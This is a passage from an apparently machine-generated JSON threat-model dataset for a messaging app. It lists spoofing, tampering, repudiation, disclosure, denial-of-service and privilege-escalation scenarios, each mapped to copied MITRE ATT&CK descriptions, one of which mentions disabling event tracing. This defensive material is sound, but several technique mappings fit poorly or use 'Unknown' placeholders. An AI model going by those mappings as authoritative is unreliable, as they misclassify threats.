communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user sends harmful content and denies it later due to lack of logging and non-repudiation mechanisms.",
            "Assumptions": [
                {
                    "Assumption": "The application does not keep logs of sent messages or user actions.",
                    "Role": "System",
                    "Condition": "System design omits detailed logging mechanisms."
                },
                {
                    "Assumption": "There are no non-repudiation mechanisms in place for sent messages.",
                    "Role": "System",
                    "Condition": "System lacks signed message receipts or logs."
                },
                {
                    "Assumption": "User denies sending harmful content.",
                    "Role": "User",
                    "Condition": "User avoids accountability by exploiting lack of non-repudiation."
                }
            ],
            "Potential Impact": "Denial of harmful actions leading to unresolved disputes.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log absence",
                "accountability evasion",
                "user actions denial",
                "message integrity"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker performs unauthorized actions on a compromised device and the legitimate user is held responsible.",
            "Assumptions": [
                {
                    "Assumption": "The compromised device allows attacker to perform actions indistinguishable from the legitimate user.",
                    "Role": "Attacker",
                    "Condition": "Attacker gains control over the device."
                },
                {
                    "Assumption": "The application does not differentiate between actions performed by the user and attacker.",
                    "Role": "System",
                    "Condition": "System treats all device actions as user actions."
                },
                {
                    "Assumption": "Logging mechanisms do not capture detailed context of actions.",
                    "Role": "System",
                    "Condition": "Logs lack context-specific information to discern actor."
                }
            ],
            "Potential Impact": "Wrongful attribution of actions leading to user disputes.",
            "MITRE ATT&CK Keywords": [
                "device compromise",
                "action replication",
                "repudiation",
                "user impersonation",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Audit trails are tampered with, making it impossible to trace malicious user activities.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has sufficient privileges to alter logs.",
                    "Role": "Attacker",
                    "Condition": "Attacker has admin or root access."
                },
                {
                    "Assumption": "Logs are stored locally and are not secured against tampering.",
                    "Role": "System",
                    "Condition": "Log storage lacks integrity checks."
                },
                {
                    "Assumption": "The system lacks real-time log monitoring.",
                    "Role": "System",
                    "Condition": "No real-time analysis or anomaly detection for logs."
                }
            ],
            "Potential Impact": "Erase trace of malicious actions and impede investigations.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "log manipulation",
                "repudiation",
                "audit trail",
                "forensics evasion"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the app to gain unauthorized access to encrypted messages.",
            "Assumptions": [
                {
                    "Assumption": "The encryption implementation has vulnerabilities.",
                    "Role": "System",
                    "Condition": "Encryption algorithm or its implementation contains flaws."
                },
                {
                    "Assumption": "The attacker has knowledge of the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Attacker discovers and exploits the vulnerability."
                },
                {
                    "Assumption": "The application does not have timely patching to eliminate vulnerabilities.",
                    "Role": "System",
                    "Condition": "System is slow to apply security patches."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive communications.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "encrypted data access",
                "information disclosure",
                "cryptographic weakness",
                "network attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A malicious application on the same device reads data from the messaging app's SQLite database.",
            "Assumptions": [
                {
                    "Assumption": "Data stored in SQLite database is not isolated from other apps.",
                    "Role": "System",
                    "Condition": "Database permissions are improperly configured."
                },
                {
                    "Assumption": "Users install malicious applications that compromise data confidentiality.",
                    "Role": "User",
                    "Condition": "Users unknowingly install malicious apps."
                },
                {
                    "Assumption": "The storage encryption is bypassable or weak.",
                    "Role": "System",
                    "Condition": "Encryption is weak or can be bypassed by attacker."
                }
            ],
            "Potential Impact": "Compromise of stored messages and authentication credentials.",
            "MITRE ATT&CK Keywords": [
                "data breach",
                "database access",
                "information disclosure",
                "app isolation failure",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses phishing attacks to trick users into sharing their private keys.",
            "Assumptions": [
                {
                    "Assumption": "Users can be deceived by well-crafted phishing attempts.",
                    "Role": "User",
                    "Condition": "Phishing attempts are sophisticated and convincing."
                },
                {
                    "Assumption": "Phishing mediums (emails, fake websites, etc.) reach the users successfully.",
                    "Role": "Attacker",
                    "Condition": "Attacker can deliver phishing content to users."
                },
                {
                    "Assumption": "Users aren\u2019t using additional phishing protection mechanisms.",
                    "Role": "User",
                    "Condition": "Users lack or do not use security awareness and protection tools."
                }
            ],
            "Potential Impact": "Exposure of private keys leading to unauthorized data decryption.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "credential theft",
                "social engineering",
                "information disclosure",
                "identity compromise"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the messaging servers with illegitimate traffic, rendering the service unavailable.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can generate and direct massive traffic towards the servers.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to a botnet or similar resources."
                },
                {
                    "Assumption": "The server infrastructure cannot handle excessive traffic without degradation.",
                    "Role": "System",
                    "Condition": "Server capacity and protections are inadequate for high traffic volumes."
                },
                {
                    "Assumption": "No effective DDoS protection mechanisms are in place.",
                    "Role": "System",
                    "Condition": "DDoS protection is either absent or ineffective."
                }
            ],
            "Potential Impact": "Disruption of messaging services leading to service unavailability.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "service outage",
                "illegitimate traffic",
                "network flooding",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits bugs in the mobile application to crash users' devices during message processing.",
            "Assumptions": [
                {
                    "Assumption": "The mobile application has vulnerabilities that can be triggered during message processing.",
                    "Role": "System",
                    "Condition": "Application software contains exploitable bugs."
                },
                {
                    "Assumption": "The attacker knows the specific vulnerabilities and the method to exploit them.",
                    "Role": "Attacker",
                    "Condition": "Attacker has detailed knowledge of the bugs."
                },
                {
                    "Assumption": "Users are running the vulnerable version of the mobile application.",
                    "Role": "User",
                    "Condition": "Users have not updated to a patched version."
                }
            ],
            "Potential Impact": "Disruption of user experience and temporary unavailability of the messaging application.",
            "MITRE ATT&CK Keywords": [
                "app crash",
                "exploit",
                "device disruption",
                "vulnerability exploitation",
                "targeted attack"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the storage capacity on the primary device by sending numerous large files, making the app unusable.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can send files of any size to the user.",
                    "Role": "Attacker",
                    "Condition": "No restrictions on file size or number from the attacker."
                },
                {
                    "Assumption": "The storage management does not mitigate rapid storage exhaustion.",
                    "Role": "System",
                    "Condition": "Storage management policies are inadequate."
                },
                {
                    "Assumption": "User device has limited storage capacity.",
                    "Role": "User",
                    "Condition": "User device storage is relatively small or near capacity."
                }
            ],
            "Potential Impact": "Service disruption due to storage exhaustion.",
            "MITRE ATT&CK Keywords": [
                "storage exhaustion",
                "file flooding",
                "storage capacity attack",
                "service disruption",
                "device overload"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker escalates privileges on the mobile device to access the messaging app's stored keys.",
            "Assumptions": [
                {
                    "Assumption": "A vulnerability exists in the mobile OS that allows privilege escalation.",
                    "Role": "System",
                    "Condition": "Operating system has an exploitable vulnerability."
                },
                {
                    "Assumption": "The attacker can exploit this vulnerability before it is patched.",
                    "Role": "Attacker",
                    "Condition": "Attacker is faster than patch release and application."
                },
                {
                    "Assumption": "The private keys are stored locally on the device in a manner accessible to elevated privileges.",
                    "Role": "System",
                    "Condition": "Key storage is insecure or poor permission settings."
                }
            ],
            "Potential Impact": "Unauthorized access to encryption keys leading to compromised communications.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "key access",
                "device compromise",
                "encryption bypass"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains admin-level access to the desktop client, allowing modification of the app and its data.",
            "Assumptions": [
                {
                    "Assumption": "There are admin-level vulnerabilities in the desktop client.",
                    "Role": "System",
                    "Condition": "Desktop software has security flaws allowing admin access."
                },
                {
                    "Assumption": "The attacker can exploit these vulnerabilities and gain elevated privileges.",
                    "Role": "Attacker",
                    "Condition": "Attacker can exploit software vulnerabilities."
                },
                {
                    "Assumption": "Application data and settings are not securely protected from admin-level access.",
                    "Role": "System",
                    "Condition": "Data is accessible/modifiable with admin rights."
                }
            ],
            "Potential Impact": "Full system compromise and manipulation of messaging functions.",
            "MITRE ATT&CK Keywords": [
                "admin access",
                "desktop client",
                "privilege escalation",
                "data manipulation",
                "system compromise"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious app installed on the primary device exploits weaknesses to perform actions with higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "The malicious app is installed and can exploit weak permissions.",
                    "Role": "User",
                    "Condition": "User installs malicious app."
                },
                {
                    "Assumption": "The mobile OS has exploitable weaknesses allowing privilege escalation.",
                    "Role": "System",
                    "Condition": "Operating system has insufficient permission controls."
                },
                {
                    "Assumption": "The app does not run sandboxed or with appropriate security constraints.",
                    "Role": "System",
                    "Condition": "Lack of app isolation and sandboxing."
                }
            ],
            "Potential Impact": "Unauthorized actions and access within the messaging app.",
            "MITRE ATT&CK Keywords": [
                "malicious app",
                "privilege escalation",
                "device compromise",
                "app exploitation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        }
    ]
},
{
    "case_number": "13",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker creates a fake desktop client that mimics a legitimate messaging application to steal user credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users may download and install software from unofficial sources.",
                    "Role": "User",
                    "Condition": "User seeks out alternative download locations."
                },
                {
                    "Assumption": "The attacker's fake application can mimic the visual and functional aspects of the legitimate application.",
                    "Role": "Attacker",
                    "Condition": "Attacker has resources to create a convincing impersonation."
                },
                {
                    "Assumption": "The primary device does not have mechanisms to detect or alert about unverified companion apps.",
                    "Role": "Application Developer",
                    "Condition": "Primary device relies on user judgment for app validation."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "network",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker intercepts the initial communication between the primary and companion devices to hijack the session.",
            "Assumptions": [
                {
                    "Assumption": "Intercepted communication is not protected by strong mutual authentication.",
                    "Role": "Application Developer",
                    "Condition": "Lack of mutual authentication mechanisms."
                },
                {
                    "Assumption": "Users are unaware of the session hijack.",
                    "Role": "User",
                    "Condition": "No visible signs of session compromise to the user."
                },
                {
                    "Assumption": "The attacker's network position allows interception of communication.",
                    "Role": "Attacker",
                    "Condition": "Position in the network enables man-in-the-middle attacks."
                }
            ],
            "Potential Impact": "Unauthorized access and potential data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "man-in-the-middle",
                "network communication",
                "session hijacking"
            ],
            "mitre_technique": {
                "name": "Browser Session Hijacking",
                "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.(Citation: Wikipedia Man in the Browser)\n\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.(Citation: Cobalt Strike Browser Pivot)(Citation: ICEBRG Chrome Extensions) Executing browser-based behaviors such as pivoting may require specific process permissions, such as <code>SeDebugPrivilege</code> and/or high-integrity/administrator rights.\n\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as [Sharepoint](https://attack.mitre.org/techniques/T1213/002) or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.(Citation: cobaltstrike manual)",
                "id": "attack-pattern--544b0346-29ad-41e1-a808-501bb4193f47",
                "technique_id": "T1185"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends phishing emails that mimic official messaging application notifications to trick users into revealing credentials.",
            "Assumptions": [
                {
                    "Assumption": "Users may not verify the authenticity of the email contents.",
                    "Role": "User",
                    "Condition": "User receives phishing email."
                },
                {
                    "Assumption": "The attackers have access to email templates and branding materials of the legitimate apps.",
                    "Role": "Attacker",
                    "Condition": "Attacker can craft realistic phishing emails."
                },
                {
                    "Assumption": "Email systems do not adequately filter these phishing attempts.",
                    "Role": "Email Service Provider",
                    "Condition": "Email filters fail to detect phishing emails."
                }
            ],
            "Potential Impact": "Unauthorized access to user accounts and sensitive data.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "phishing",
                "social engineering",
                "email"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains physical access to a primary or companion device and modifies the messaging application\u2019s database to manipulate stored messages or credentials.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have physical access to the device.",
                    "Role": "Attacker",
                    "Condition": "Device is left unattended or lost."
                },
                {
                    "Assumption": "Device encryption is either weak or not utilized.",
                    "Role": "User",
                    "Condition": "User has not enabled strong device encryption."
                },
                {
                    "Assumption": "The application\u2019s database does not have integrity checks that can detect unauthorized modifications.",
                    "Role": "Application Developer",
                    "Condition": "Lack of database integrity verification."
                }
            ],
            "Potential Impact": "Data integrity and confidentiality are compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device",
                "database",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker exploits a vulnerability in the messaging application to alter messages in transit between users.",
            "Assumptions": [
                {
                    "Assumption": "There is a vulnerability in the messaging application's code that allows message tampering.",
                    "Role": "Application Developer",
                    "Condition": "Unpatched or new vulnerability exists."
                },
                {
                    "Assumption": "The attacker can intercept the communication.",
                    "Role": "Attacker",
                    "Condition": "Attacker has MITM capabilities."
                },
                {
                    "Assumption": "The encryption methods used are not completely end-to-end or have flaws.",
                    "Role": "Application Developer",
                    "Condition": "Encryption flaws or incomplete implementation."
                }
            ],
            "Potential Impact": "Data integrity is compromised.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "man-in-the-middle",
                "network communication",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "DHCP Spoofing",
